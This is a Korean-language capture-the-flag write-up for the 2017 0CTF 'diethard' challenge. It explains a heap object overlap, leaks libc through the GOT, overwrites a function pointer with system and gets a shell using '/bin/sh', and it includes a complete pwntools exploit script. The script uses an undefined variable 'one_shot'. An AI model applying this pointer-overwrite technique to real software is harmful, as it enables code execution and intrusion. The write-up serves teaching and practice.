# 2017_0ctf_diethard

## Key words

- x86-64 | NX
- custom heap

## Solution

메뉴는 할당, 해제, 종료 기능이 제공 됩니다.

키워드에 커스텀 힙이라고 한 이유는 사실 잘 분석이 잘 안된 이유도 있고 페이지를 할당하여 그곳에서 힙과 비슷한 동작을 했기 때문에 커스텀 힙이라고 했습니다. 오브젝트 구조와 할당에 관련해서 자세하게 정리한 블로그를 참고하시면 좋을 것 같습니다.[1]

```c
struct Message_Small {
    unsigned long prev_id;
    size_t length;
    char *content;
    void (*print)(char *, size_t);
    char buf[length + 1];
};
struct Message_Large {
    unsigned long prev_id;
    size_t length;
    char *content;
    void (*print)(char *, size_t);
}
```

할당 시 크기를 2016 보다 작게 하면 small로 할당되고 2016이상이 되면 large로 할당이 됩니다.

보통 이런 문제는 문자열 포인터를 덮어서 원하는 주소를 릭 하고, 함수 포인터를 덮어서 실행 흐름을 변경해야 하는데 분석하는 동안에는 어떻게 오브젝트를 덮을 수 있을지 찾지 못했습니다.

그런데 한참 시도 하던 도중 다음과 같은 덤프를 보았습니다.

```python
fn_addMsg(0x20, "A")
fn_addMsg(0x20, "B")
fn_addMsg(2016, "C"*8)
```

```
*** 0x603340 *** :
00000000  00 80 ed f7  ff 7f 00 00  00 88 ed f7  ff 7f 00 00  │····│····│····│····│
00000010  08 90 ed f7  ff 7f 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│

*** 0x7ffff7ed8000 *** :
00000000  00 00 00 00  00 00 00 00  00 04 00 00  00 00 00 00  │····│····│····│····│
00000010  20 80 ed f7  ff 7f 00 00  76 09 40 00  00 00 00 00  │ ···│····│v·@·│····│
00000020  41 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │A···│····│····│····│
00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│

*** 0x7ffff7ed8800 *** :
00000000  43 43 43 43  43 43 43 43  00 00 00 00  00 00 00 00  │CCCC│CCCC│····│····│
00000010  20 88 ed f7  ff 7f 00 00  76 09 40 00  00 00 00 00  │ ···│····│v·@·│····│
00000020  42 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │B···│····│····│····│
00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│

*** 0x7ffff7ed9008 *** :
00000000  00 00 00 00  00 00 00 00  e0 07 00 00  00 00 00 00  │····│····│····│····│
00000010  00 88 ed f7  ff 7f 00 00  76 09 40 00  00 00 00 00  │····│····│v·@·│····│
00000020  02 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
```

`0x7ffff7e8810` 위치는 2번째 오브젝트 인데 바로 그 직전인 `0x7ffff7ed8800`에 문자열 `CCCCCCCC`가 씌여졌습니다.

이를 이용하여 먼저 문자열 포인터를 `got@__libc_start_main`으로 덮고, `delete message` 메뉴를 이용하여 libc 주소를 구합니다.

`delete` 메뉴에서는 함수 포인터를 호출 하기 때문에 유용하게 사용될 수 있습니다.

```c
(*(void (__fastcall **)(_QWORD, _QWORD))(g_arrMsg_603340[i] + 0x18))(
  *(_QWORD *)(g_arrMsg_603340[i] + 16),
  (unsigned int)*(_QWORD *)(g_arrMsg_603340[i] + 8));
```

오브젝트를 모두 해제 하고, 다시 위와 같이 할당 한뒤, 함수 포인터를 `system`으로 변경하고 문자열 주소를 `/bin/sh`주소로 변경한뒤, 해제를 하면 쉘이 떨어 집니다.

## Exploit code

```python
from pwn import *
context(arch='amd64', os='linux')

def fn_addMsg(n, msg):
	p.sendline("1")
	print p.recv()

	p.sendline(str(n))
	print p.recv()

	p.sendline(msg)
	print p.recv()

def fn_delMsg(idx):
	p.sendline("2")
	print p.recv()

	p.sendline(str(idx))
	print p.recv()

def fn_leak(addr, n, title=""):
	print "*** {} *** : {}".format(hex(addr), title)
	print hexdump(p.leak(addr, n))

target = "./diethard"
p = process(target)
e = ELF(target)

got_libc = e.got["__libc_start_main"]

print p.recv()

addr_arrList = 0x603340
addr_c1 = 0x7ffff7ed8000
addr_c2 = 0x7ffff7ed8800
addr_c3 = 0x7ffff7ed9008

addr_cc1 = 0x7ffff7eda018

fn_addMsg(0x400, "A")
fn_addMsg(0x400, "B")
payload = "C" * 8
payload += p64(0x30)
payload += p64(got_libc)
payload += p64(0x400976)
fn_addMsg(2016, payload)

fn_leak(addr_arrList, 0x80)
fn_leak(addr_c1, 0x80)
fn_leak(addr_c2, 0x80)
fn_leak(addr_c3, 0x80)

p.sendline("2")
data = p.recvuntil("Which Message You Want To Delete?\n")
data = u64(data.split("1. ")[1][:6].ljust(8, "\x00"))

libc_base = data - 0x20740
addr_system = libc_base + 0x45390
binsh = libc_base + 0x18cd17

p.sendline("10")
print p.recv()

fn_delMsg(0)
fn_delMsg(1)
fn_delMsg(2)

fn_addMsg(1032, "A")
fn_addMsg(1032, "B")
payload = "C"*8
payload += p64(0x20)
payload += p64(binsh)
payload += p64(addr_system)
fn_addMsg(2016, payload)

print "__libc_start_main : " + hex(data)
print "one_shot          : " + hex(one_shot)

fn_leak(addr_arrList, 0x80)
fn_leak(addr_c1, 0x80)
fn_leak(addr_c2, 0x80)
fn_leak(addr_c3, 0x80)

p.sendline("2")
p.interactive()
```

[1]: http://charo-it.hatenablog.jp/entry/2017/03/24/114341
